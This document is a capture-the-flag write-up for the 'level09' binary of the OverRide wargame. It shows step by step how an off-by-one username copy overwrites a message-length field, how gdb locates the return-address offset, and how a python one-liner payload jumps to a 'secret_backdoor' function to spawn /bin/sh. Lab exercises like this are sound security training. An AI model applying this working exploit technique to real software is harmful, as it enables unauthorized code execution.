After analyzing the program, we see that the `main` call the function `handle_msg`. This function use a struct that contain a 140 char message, a 40 char username, and a number that represent the max length of the message, it should looks like this :
[Message][username][number hard coded to 140]
[140 char][40 char][the number 140]

But the function `set_username` allow use to copy 41 char :
`for ( i = 0; i <= 40 && s[i]; ++i )`
And since we start copying the username at the index `140` (from the start of the struct) we can write until the index `181`

So we can change the low order part of the number and change 140 : `0x8c` to the max we can put `0xff`

Since the max length of the message is set from the number at the index `180` from the start of the struct.
We can now write a message of `255` char long and overflow the struct.
Let's try to put 40 char to fill the buffer and a the char `\xff` at the end to find the offset to `eip` using [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

```
(gdb) r <<< "$(python -c 'print "a" * 40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa
6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
d3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9
Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A"')"
Starting program: /home/users/level09/level09 <<< "$(python -c 'print "a" * 40 +
 "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac
0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6A
e7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3
Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A"')"
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
(gdb) x/1w $rsp
0x7fffffffe5c8: 0x37674136
```

Since we are on 64-bit the return address is in `$rsp`
Putting this in [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/) give us an offset of `200`

Now that we have the offset, we get the address of the function `secret_backdoor` that allow use to launch a command

```
(gdb) start
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Temporary breakpoint 2 at 0x555555554aac
Starting program: /home/users/level09/level09
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Temporary breakpoint 2, 0x0000555555554aac in main ()
(gdb) p secret_backdoor
$2 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
```

Address of `secret_backdoor` : `0x55555555488c`
In little-endian : `\x8c\x48\x55\x55\x55\x55\x00\x00`

Let's recap
1 part : username (override that we use to overwrite the number) `"a" * 40 + "\xff"`
2 part : Our offset and the address which we will write `"a" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00"`
3 part : the command that will be execute with `system` : `"/bin/sh"`

on assemble le tout : `python -c 'print "a"*40 + "\xff" + "\n" + "a"*200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"'`

```Shell
level09@OverRide:~$ python -c 'print "a" * 40 + "\xff" + "\n" + "a" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00" + "\n" + "/bin/sh"' > /tmp/exploit
level09@OverRide:~$ cat /tmp/exploit - | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�>: Msg @Unix-Dude
>>: >: Msg sent!
whoami
end
```
